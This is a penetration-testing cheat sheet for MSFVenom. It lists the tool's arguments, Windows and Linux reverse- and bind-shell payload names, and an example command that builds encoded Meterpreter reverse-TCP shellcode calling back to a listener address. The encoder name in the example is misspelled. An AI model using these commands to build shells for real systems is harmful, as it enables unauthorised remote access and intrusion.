## MSFVenom

> ##### Arguments

```
-p - payload
--payload-options
    Display available payloads
LHOST=ADDRESS - Argument for IP Address
LPORT=PORT - Argument for port
-n [number] - NOPS
--platform {Windows|Linux} - Platform to build shellcode for
-a {x86|x64} - Architecture
-e {x86/shikata_ga_nai} - encoder
-b '{badchars}' - remove badchars from payload
-v [string] - name your variable
-f {python} - format for payload
--smallest - attempt to make payload as tiny as possible
```

> ##### Examples

```
Kali> msfvenom -p windows/meterpreter/reverse_tcp
                                lhost=192.168.1.232
                                lport=4444
                                --platform Windows
                                -a x86
                                -e x86/shikita_ga_nai
                                -b '\x00\x20\x25\x2b\x2f\x5c'
                                -v payload
                                -f python
                                --smallest
```
> ##### Linux x64 Payloads
```
linux/x64/meterpreter/reverse_tcp
linux/x64/meterpreter/bind_tcp
linux/x64/meterpreter_reverse_https
linux/x64/shell_bind_tcp
linux/x64/shell_reverse_tcp
linux/x64/exec
```
> ##### Linux x86 Payloads
```
linux/x86/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp
linux/x86/meterpreter_reverse_https
linux/x86/shell_reverse_tcp
linux/x86/shell_bind_tcp
linux/x86/exec
```
> ##### Windows x64 Payloads
```
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/meterpreter/reverse_https
windows/x64/shell_reverse_tcp
windows/x64/shell_bind_tcp
windows/x64/exec
```
> ##### Windows x86 Payloads
```
windows/meterpreter_reverse_tcp
windows/meterpreter_bind_tcp
windows/meterpreter_reverse_https
windows/shell_reverse_tcp
windows/shell_bind_tcp
windows/exec
```
